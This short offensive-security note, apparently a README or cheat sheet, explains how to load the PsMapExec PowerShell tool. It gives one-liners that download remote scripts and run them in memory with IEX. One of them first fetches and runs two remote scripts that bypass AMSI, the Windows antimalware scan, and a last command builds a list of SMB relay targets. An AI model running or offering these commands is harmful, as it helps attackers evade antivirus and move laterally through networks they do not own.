Here you can load PsMapExec :

This will automatically blocked by your AV
```
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```

Bypass AMSI and load PsMapExec :)
```
iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/aman.txt -Usebasicparsing);Start-sleep -s 3;iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/lain.txt -Usebasicparsing);Start-sleep -s 3;iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```

You can start by check SMB signing
```
PsMapExec -Targets All -Method GenRelayList
```



